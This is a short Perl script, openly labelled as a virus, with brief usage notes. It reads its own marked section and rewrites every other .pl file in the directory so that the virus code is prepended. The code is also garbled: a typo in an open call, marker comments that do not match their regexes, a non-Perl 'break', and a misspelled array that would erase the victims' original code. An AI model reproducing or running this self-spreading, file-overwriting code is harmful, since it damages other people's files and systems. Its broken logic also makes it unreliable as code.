#!/usr/bin/env Perl
=Created by John Melody
usage:
chmod 755 virus.pl & create a file ( probably hello world file)
./{filename}.pl => ` cat {filename}.pl `
./{virus.pl} :
=cut

####virus begin######
#
# Get a copy of virus
 my@vCode = ();
 my$invirus = 0;
 open(ny $fh, $0);
 while(my $line = <$fh>) {
	 if ($line =~ /^####VIRUS BEGIN####/) {$invirus = 1}
	 if ($invirus) { push(@vCode, $line);}
	 if ($line =~ /^####VIRUS ENDED####/) {$invirus = 0}
}
close($fh);

# Find potential Victim
my @files = glob("*.pl");

# check and infect
foreach $file (@files) {
	my $infected = 0;
	my @pCode = ();
	open(my $fh, $file);
	while(my $line = <$fh>){
		if($line =~ /^####VIRUS BEGIN####/) {$infected = 1; break;}
		push(@pCode, $line);
	}
	close($fh);

	if (! $infected){
		# creatre a list of lines
		my @nCode = ();
		if($pCode[0] =~ /^#/) { push(@nCode, shift(@pCode)); }
		foreach $line (@vCode) { push(@nCode, $line); }
		foreach $line (@pcode) { push(@nCode, $line); }
		# write new list of lines
		open(my $fh, ">", $file);
		foreach $line (@nCode) { print $fh $line; }
		close($fh);
	}
}
########virus END###
